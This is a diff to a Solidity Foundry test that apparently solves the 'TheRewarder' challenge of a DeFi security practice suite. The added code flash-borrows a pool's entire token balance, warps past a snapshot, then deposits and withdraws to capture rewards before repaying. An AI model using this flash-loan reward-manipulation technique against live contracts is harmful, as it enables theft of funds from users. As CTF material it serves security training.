@@ -89,9 +89,23 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.warp(theRewarderPool.lastRecordedSnapshotTimestamp() + 5 days); // 5 days
+
+        uint256 maxFlashLoanAmount = dvt.balanceOf(address(flashLoanerPool));
+        flashLoanerPool.flashLoan(maxFlashLoanAmount);
 
         /** EXPLOIT END **/
         validation();
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        dvt.transfer(attacker, amount);
+        vm.startPrank(attacker);
+        dvt.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+        theRewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanerPool), amount);
+        vm.stopPrank();
     }
 
     function validation() internal {
